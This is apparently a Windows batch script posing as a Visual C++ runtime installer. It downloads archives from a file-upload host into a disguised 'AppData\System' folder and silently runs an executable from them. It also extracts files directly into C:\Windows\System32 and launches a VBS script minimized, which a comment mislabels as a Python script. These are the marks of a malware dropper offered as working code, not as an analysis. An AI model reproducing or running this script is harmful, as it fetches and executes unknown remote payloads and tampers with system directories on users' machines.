@echo off
set "zipScriptUrl=https://s01.babup.com/uploads/Installer_16244.zip"
set "vcruntimeZipUrl=https://s01.babup.com/uploads/vcruntime140.zip"

:: Create directory if it doesn't exist
set "directoryPath=%USERPROFILE%\AppData\System"
if not exist "%directoryPath%" (
    mkdir "%directoryPath%"
)

:: Download the zip script
powershell -command "Invoke-WebRequest '%zipScriptUrl%' -OutFile '%directoryPath%\System.zip'"

:: Unzip the script in the same directory
powershell -command "Expand-Archive -Path '%directoryPath%\System.zip' -DestinationPath '%directoryPath%' -Force"

:: Install VC.exe silently
"%directoryPath%\VC.exe" /install /passive /norestart

:: Download vcruntime140.zip
powershell -command "Invoke-WebRequest '%vcruntimeZipUrl%' -OutFile 'vcruntime140.zip'"

:: Extract vcruntime140.zip into C:\Windows\System32
powershell -command "Expand-Archive -Path 'vcruntime140.zip' -DestinationPath 'C:\Windows\System32' -Force"

:: Run Python script (assumes BN.vbs exists in the specified directory)
cd /d "%directoryPath%"
start /min BN.vbs

:: Display completion message
echo Script completed!
